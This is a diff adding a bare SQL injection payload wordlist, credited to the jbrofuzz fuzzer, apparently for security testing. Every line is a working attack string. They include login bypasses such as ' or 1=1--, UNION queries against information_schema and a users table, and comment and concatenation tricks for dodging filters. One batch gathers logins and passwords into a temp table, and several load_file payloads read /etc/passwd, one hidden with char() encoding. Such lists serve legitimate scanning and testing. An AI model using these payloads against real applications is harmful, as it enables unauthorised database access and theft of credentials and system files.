@@ -1,0 +1,57 @@
+# Contains statements from jbrofuzz (13 April 2010)
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' or 1=1-- 
+or 1=1
+' or '1'='1
+; or '1'='1'
+" or isNULL(1/0) /*
+' or '7659'='7659
+" or isNULL(1/0) /*
+' -- 
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+admin' or '
+' select * from information_schema.tables--
+) union select * from information_schema.tables;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' or 'unusual' = 'unusual'
+' or 'something' = 'some'+'thing'
+' or 'text' = n'text'
+' or 'something' like 'some%'
+' or 2 > 1
+' or 'text' > 't'
+' or 'whatever' in ('whatever')
+' or 2 between 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select 
+password:*/=1--
+uni/**/on sel/**/ect
+'; execute immediate 'sel' || 'ect us' || 'er'
+'; exec ('sel' + 'ect us' + 'er')
+'/**/or/**/1/**/=/**/1
+' or 1/*
+ or isNULL(1/0) /*
+' or '7659'='7659
+" or isNULL(1/0) /*
+' -- &password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+@var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+
